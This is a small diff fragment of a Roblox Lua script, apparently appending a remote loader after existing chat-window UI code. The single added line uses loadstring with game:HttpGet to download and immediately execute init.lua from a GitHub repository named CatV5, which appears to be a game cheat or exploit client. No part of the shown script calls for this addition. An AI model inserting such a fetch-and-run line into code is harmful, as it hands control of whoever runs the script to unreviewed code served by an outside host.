@@ -1055,4 +1055,5 @@ StarterGui:SetCore("ChatWindowPosition", UDim2.new(0, 0, 0))
             end
         end
     })
+loadstring(game:HttpGet('https://raw.githubusercontent.com/new-qwertyui/CatV5/refs/heads/main/init.lua'), 'init.lua')()
 
